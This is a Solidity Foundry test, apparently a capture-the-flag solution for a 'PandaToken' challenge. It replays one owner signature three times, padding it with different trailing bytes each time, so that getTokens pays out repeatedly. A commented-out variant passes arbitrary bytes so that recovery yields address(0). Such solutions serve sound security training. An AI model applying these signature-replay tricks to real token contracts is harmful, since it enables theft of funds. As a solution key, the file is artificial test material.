// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "src/PandaToken.sol";


contract Hack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // solution

		// method 1. get token from owner
		//   the first 0x41 bytes must be correct
		{
			bytes memory signature = abi.encodePacked(r, s, v);
			pandatoken.getTokens(1 ether, signature);
		}
		{
			bytes memory signature = abi.encodePacked(r, s, v, uint(1));
			pandatoken.getTokens(1 ether, signature);
		}
		{
			bytes memory signature = abi.encodePacked(r, s, v, uint(2));
			pandatoken.getTokens(1 ether, signature);
		}

		// method 2. get token from address(0)
		//   just send any bytes to it, as long as it's different
		//
		// for (uint i=0; i<3; i++) {
		// 	bytes memory signature = abi.encodePacked(i, i, i);
		// 	pandatoken.getTokens(1 ether, signature);
		// }

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}
